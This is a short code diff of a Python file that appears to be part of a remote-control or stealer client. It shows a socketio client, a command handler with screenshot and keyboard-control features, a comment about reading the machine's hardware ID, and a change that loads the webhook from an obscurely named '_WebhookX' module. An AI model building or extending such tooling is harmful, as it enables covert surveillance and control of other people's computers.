@@ -14,8 +14,11 @@ import os
 import subprocess
 import io
 
-from configuration import Config 
+from config import Config 
 cc = Config()
+
+from __webhook import _WebhookX
+
 
 # getting hwid = wmic csproduct get uuid
 
@@ -26,7 +29,7 @@ sio = socketio.Client()
 
 class CommandHandler():
     def __init__(self):
-        self.webhook = web(cc.get_webhook())
+        self.webhook = _WebhookX().get_object()
         self.keyboard = Controller()
         
     def screenshot(self):
